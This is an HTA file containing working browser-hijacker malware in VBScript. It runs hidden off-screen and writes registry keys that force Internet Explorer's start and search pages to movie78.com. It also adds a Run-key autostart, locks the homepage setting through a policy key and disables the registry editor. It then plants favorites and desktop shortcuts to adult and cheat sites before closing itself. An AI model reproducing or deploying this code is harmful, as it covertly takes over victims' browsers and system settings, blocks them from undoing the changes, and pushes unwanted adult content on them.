<html>
<hta:application caption="no" showintaskbar="no">
<body onload="window.blur();">
<object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script language=vbscript>
l=screen.width+200
t=screen.height+200
moveTo l,t
resizeTo 0,0
</script>
<script LANGUAGE="VBScript">
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://www.movie78.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://www.movie78.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "Http://www.movie78.com" 
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "Http://www.movie78.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","Http://www.movie78.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","Http://www.movie78.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","Http://www.movie78.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","Http://www.movie78.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Second Home Page","Http://www.movie78.com"
bugs.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","1","REG_DWORD"
bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IEXPLORE.EXE", "IEXPLORE.EXE Http://www.movie78.com"
bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","1","REG_DWORD"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", "娱乐在线 www.movie78.com"
on error resume next
Call LongFei_AddFavorites("-【火辣成人视频1&】","Http://www.movie321.com")
Call LongFei_AddFavorites("【激情音乐1&】","Http://www.av178.com")
Call LongFei_AddFavorites("-【美女写真1&】","Http://www.17rm.com")
Call LongFei_AddFavorites("【外挂破解1&】","Http://www.rm78.com")
on error resume next
Call LongFei_AddDesktop("激情音乐网1&","Http://www.av178.com")
Call LongFei_AddDesktop("免费最新大片,激情电影在线1&","http://www.tflashg.com")
Call LongFei_AddDesktop("激情电影让你爽个够1&","http://www.rm78.com")


on error resume next
Call LongFei_AddQuickLaunch("[激情音乐1&]","Http://www.av178.com")
Call LongFei_AddQuickLaunch("[免费最新大片,激情电影在线1&]","http://www.tflashg.com")
Call LongFei_AddFavorites("【激情电影让你爽个够1&】","http://www.rm78.com")



Function LongFei_AddFavorites(N, U)
	on error resume next
	Set S = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
	Set Sl = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/链接/" + N +".URL")
	Sl.TargetPath = U
	Sl.Save()
End Function

Function LongFei_AddDesktop(N, U)
	on error resume next
	Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
End Function
</script>
<script language="JScript.Encode">
function closeit() {
setTimeout("self.close()",5)
}
closeit()
</script>
</html>